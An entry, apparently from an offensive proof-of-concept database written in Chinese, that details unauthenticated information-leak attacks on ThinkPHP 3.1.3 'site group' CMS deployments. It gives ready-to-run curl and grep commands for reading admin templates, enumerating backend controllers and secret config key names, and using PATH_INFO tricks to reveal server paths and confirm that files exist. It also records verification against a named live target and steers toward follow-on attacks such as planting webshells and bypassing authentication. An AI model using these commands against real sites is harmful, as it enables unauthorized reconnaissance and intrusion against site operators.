# ThinkPHP 3.1.3 站群：/App/Tpl 模板目录零凭证直读 + /App/Conf 配置存在性（PATH_INFO）→ 后台入口/控制器方法与配置键名全泄露

- **code**: thinkphp-3.1.3-站群-app-tpl-模板目录零凭证直读-app-conf-配置存在性-path_
- **kind**: template
- **category**: info-leak
- **component**: SomCNS 站群 CMS（ThinkPHP 3.1.3，App/Tpl + App/Conf 静态面）
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 两条独立 finding 在同一靶标 https://thbac1dsua6v.gwtkx5hgk5.xyz/ 零 Cookie 复测成立：
① task#637 / finding 1308（2026-11-08，curl -k --noproxy '*'）：GET /App/Tpl/Admin/Index_login.html → 200 后台登录表单明文（action 与 username/password 字段）；GET /App/Home/OrderAction.class.php/ → 200 且 Fatal error 回显 docroot /www/wwwroot/thisthbweb_com；GET /App/Conf/config.php/xxx → 200（config.db.php / config.site.php 同）；对照 .env、备份包、源码 zip 全 404。
② task#648 / finding 1318（2026-11-09 14:44–14:52 GMT，Windows curl.exe -k --noproxy '*'，目标经 CNAME 到 70.36.96.54 代理节点）：Index_login.html 200/1086B（username/password 表单）、Public_left.html 200/4116B（System/Main/Admin/Block/Article/User/Payorder 等 U() 链接）、System_index.html 200/8651B（cfg_client_secret、cfg_sms_pass 等 24 个 cfg_* 键名）、Home/List_index.html 200/38360B（<somnus:sitecfg> 标签与模板变量）；阴性对照 Daikuan_index.html → 404/548B。两次均零 Cookie、零账号，判定「模板目录可零凭证直读、配置键名与后台暴露面泄露」成立。
- **path**: pocs/thinkphp-3.1.3-站群-app-tpl-模板目录零凭证直读-app-conf-配置存在性-path_/poc.md
- **tags**: thinkphp3.1.3,站群,somcns,info-leak,模板直读,配置泄露,path-info,后台枚举,零凭证,app-tpl
- **created_at**: 2026-11-08T10:02:19.229Z
- **engine**: https://thbac1dsua6v.gwtkx5hgk5.xyz/

## 描述

SomCNS/ThinkPHP 3.1.3 站群把 App/ 目录整体放在 docroot 内且 nginx 未 deny，导致三件事零凭证可做：① /App/Tpl/**/*.html 模板被当静态文件直出，后台登录页（字段名）、后台左侧菜单（=全部后台控制器/方法名）、Admin/System_index.html 里的全部 cfg_* 配置键名（含 cfg_client_secret、cfg_sms_pass 这类密钥键名）、Home 模板源码与 <somnus:sitecfg> 标签用法全部可读；② /App/**/*.class.php 加尾斜杠触发 PATH_INFO 被 PHP-FPM 执行，Fatal error 回显 docroot 绝对路径，同时可当控制器/文件存在性预言机；③ /App/Conf/{config,config.db,config.site}.php 加 PATH_INFO 后缀返回 200，证明 DB/站点配置文件存在（内容不返回）。适用于后台入口枚举、模板/配置类验证的精确指路。

## 用法

```
T=https://TARGET（全程不需要 Cookie/账号；建议 curl -k --noproxy '*' 直连，避免本机系统代理）

# ① 模板目录零凭证直读（拿后台登录页 + 后台菜单 = 全部控制器/方法 + 配置键名）
curl -k -s -o /dev/null -w '%{http_code} %{size_download}\n' "$T/App/Tpl/Admin/Index_login.html"
curl -k -s "$T/App/Tpl/Admin/Public_left.html" | grep -oE '(g=Admin&m=[A-Za-z]+&a=[A-Za-z_0-9]+|\?m=[A-Za-z]+&a=[A-Za-z_0-9]+)' | sort -u
curl -k -s "$T/App/Tpl/Admin/System_index.html" | grep -oE 'cfg_[A-Za-z0-9_]+' | sort -u
curl -k -s -o /dev/null -w '%{http_code} %{size_download}\n' "$T/App/Tpl/Home/List_index.html"
# 目录不可列举（无 autoindex），按命名规则猜：Admin/{Index,Public,User,Order,Article,System,Config,Wechat,Autoart,Block,Main,Payorder}_*.html、Home/Index_*.html、Home/List_*.html
# 判据：200 + HTML 正文 = 命中该模板文件；对照一个不存在的 Admin/Daikuan_index.html 应 404（证明不是通配返回）

# ② class.php 尾斜杠执行 → docroot 回显 + 控制器存在性 oracle
curl -k -s "$T/App/Home/OrderAction.class.php/"
# 200 + "Fatal error: Class 'CommonAction' not found in /www/wwwroot/<项目>/App/..." = 文件存在且被执行
# 404 = 文件不存在；Class 'Action' not found = 该控制器 extends Action 脱队（可能绕过鉴权）

# ③ 配置文件存在性（PATH_INFO 绕过 nginx 对 .php 的 deny/解析）
for f in config config.db config.site; do
  printf '%-12s ' "$f"; curl -k -s -o /dev/null -w '%{http_code} %{size_download}\n' "$T/App/Conf/$f.php/xxx"
done
# 判据：200（body 常为 0B）= 文件存在且已被 PHP-FPM 执行；404 = 不存在。只能判存在性，拿不到内容。

# ④ 已证否，不要再花时间
for p in .env www.zip wwwroot.zip backup.tar.gz src.zip; do
  curl -k -s -o /dev/null -w "$p %{http_code}\n" "$T/$p"; done

```

## 正文

```
# ThinkPHP 3.1.3 站群：模板/配置静态面零凭证枚举

## 前置条件
- 目标为 SomCNS / ThinkPHP 3.1.3 站群（指纹：访问任意不存在路径回显「模板不存在[/www/wwwroot/<项目>/App/Tpl/...]」且页脚 ThinkPHP 3.1.3；或 GET /Help/ 拿到版本）。
- 站点 docroot 直接包含 `App/`，nginx 未对 `App/` 目录做 deny（宝塔默认站点常见）。
- 全程无需 Cookie、无需账号。

## 请求与判据

### ① 模板目录零凭证直读
```
GET /App/Tpl/Admin/Index_login.html        -> 200，后台登录表单明文
GET /App/Tpl/Admin/Public_left.html        -> 200，后台左侧菜单（= 全部后台控制器/方法入口）
GET /App/Tpl/Admin/System_index.html       -> 200，系统设置模板，泄露全部 cfg_* 配置键名（键值服务端渲染，不含值）
GET /App/Tpl/Home/Index_*.html             -> 200，首页模板（表单字段、接口路径、配置键名）
GET /App/Tpl/Home/List_*.html              -> 200，列表模板源码与模板标签用法
```
价值：
- 后台登录页 → 直接确认后台接口与字段名；
- Public_left.html 里的 `g=Admin&m=<控制器>&a=<方法>` 即完整后台暴露面清单，省掉 302/404 盲猜；
- System_index.html 里的 `cfg_client_secret`、`cfg_sms_pass` 等键名说明密钥落在 `App/Conf/config*.php`，为后续配置读取/微信签名伪造指路；
- Home 模板里的 `<somnus:sitecfg>` 之类自定义标签会暴露站点配置的渲染路径与可用变量。

目录本身不能列（无 autoindex），按命名规则猜：`Admin/{Index,Public,User,Order,Article,System,Config,Wechat,Autoart,Block,Main,Payorder}_*.html`、`Home/{Index,List}_*.html`。

### ② /App/**/*.class.php 加尾斜杠执行
```
GET /App/Home/OrderAction.class.php/
GET /App/Lib/Action/Admin/UserAction.class.php/x
```
判据（200 + 报错正文）：
```
Fatal error: Class 'CommonAction' not found in /www/wwwroot/<docroot>/App/Lib/Action/... on line 3
```
- 回显 docroot 绝对路径 → 后续写马落点、编译缓存 md5 计算都用得上；
- 同时是文件/控制器存在性预言机：404=文件不存在；`Class 'Action' not found`=该控制器 extends Action、跳过了 CommonAction 鉴权，优先打。

### ③ 配置文件存在性（PATH_INFO）
```
GET /App/Conf/config.php/xxx      -> 200（常为 0B）
GET /App/Conf/config.db.php/xxx   -> 200
GET /App/Conf/config.site.php/xxx -> 200
```
- 200 = 文件存在且被 PHP-FPM 执行；404 = 不存在。
- 只能判存在性，**拿不到配置内容**（PHP 被执行，源码不返回）。
- 价值：锁死 DB / 站点配置分文件结构，为「覆盖配置文件」「FastCGI 读取」等后续动作定位。

### ④ 已证否（同靶标实测 404）
`.env`、`www.zip` / `wwwroot.zip` / `backup.tar.gz` / `src.zip` 等备份与源码包——不要再花时间。

### ⑤ 具体文件实测（task#648 / finding 1318，同靶标复测）
| 请求 | 回显 | 结论 |
|---|---|---|
| GET /App/Tpl/Admin/Index_login.html | 200 / 1086B | `<form method="post"><input name="username"><input name="password" type="password">` → 登录字段名 |
| GET /App/Tpl/Admin/Public_left.html | 200 / 4116B | `{:U(GROUP_NAME.'/System/index')}`、Main/index、Admin/index、Block/index、Article/indexam、User/index、Payorder/index → 后台控制器/方法清单 |
| GET /App/Tpl/Admin/System_index.html | 200 / 8651B | 24 个 `cfg_*` 键名：cfg_SMS_API、cfg_client_secret、cfg_sms_pass、cfg_live_url、cfg_siteurl 等（只有键名，无值） |
| GET /App/Tpl/Home/List_index.html | 200 / 38360B | 首页/列表模板源码与 `<somnus:sitecfg>` 标签用法 |
| GET /App/Tpl/Admin/Daikuan_index.html（阴性对照） | 404 / 548B（nginx 默认页） | 按具体文件命中，不是通配返回/目录直出 |

## 失败时的常见原因
- 不是同一套站群 / 非 SomCNS → 先做 `/Help/` 与异常页版本指纹。
- nginx 对 `/App/` 做了 deny（②③ 返回 403/404）→ 该链失效，退回只做 ① 与 trace 读路径。
- CDN 缓存了上一次 404 → 加随机 query（`?v=$RANDOM`）再试。
- http 被 301 到 https → curl 加 `-L`，或直接用 https。
- 走本机系统代理导致 502/证书错 → 加 `--noproxy '*'`。

## 与既有条目的关系
- id=464：think_page_trace 泄路径 + class.php 尾斜杠执行（166/176 靶标）——本条复用其②③的判据。
- id=475：同面旧卡片（App/Tpl 静态直出），但正文为空、verified=false，本条为 task#637 实测版。
- id=372：extends Action 脱队控制器绕鉴权的验证链路，可用本条的模板枚举快速定位候选控制器。

```
